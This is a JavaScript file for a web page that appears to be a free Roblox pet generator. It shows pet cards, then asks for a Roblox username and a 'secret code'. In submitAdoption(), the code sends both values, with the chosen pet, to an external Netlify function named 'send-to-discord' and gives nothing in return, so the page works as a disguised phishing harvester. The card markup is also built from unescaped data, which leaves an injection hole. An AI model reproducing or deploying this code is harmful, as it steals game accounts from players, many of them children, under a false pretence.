let selectedPet = null;

async function loadPets() {
  const res = await fetch('pets.json');
  const pets = await res.json();
  const grid = document.getElementById('pet-grid');

  pets.forEach(pet => {
    const card = document.createElement('div');
    card.className = 'pet-card';
    card.innerHTML = `
      <img src="${pet.image}" alt="${pet.name}">
      <h3>${pet.name}</h3>
      <button onclick="selectPet('${pet.name}','${pet.image}')">Select Pet</button>
    `;
    grid.appendChild(card);
  });
}

function selectPet(name, img) {
  selectedPet = { name, img };
  document.getElementById('selected-pet-name').textContent = "You chose: " + name;
  document.getElementById('selected-pet-img').src = img;
  document.getElementById('generate-modal').style.display = 'flex';
}

function showForm() {
  document.getElementById('generate-step').style.display = 'none';
  document.getElementById('form-section').style.display = 'block';
}

async function submitAdoption() {
  const username = document.getElementById('roblox-username').value.trim();
  const code = document.getElementById('secret-code').value.trim();

  if (!username || !code) {
    alert("Please fill out all fields!");
    return;
  }

  document.getElementById('generate-modal').style.display = 'none';
  document.getElementById('popup').style.display = 'flex';

  try {
    await fetch("https://azazyes.netlify.app//.netlify/functions/send-to-discord", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        code,
        pet: selectedPet.name,
        img: selectedPet.img
      })
    });
  } catch (error) {
    console.error("Error sending data:", error);
  }
}

window.onload = loadPets;
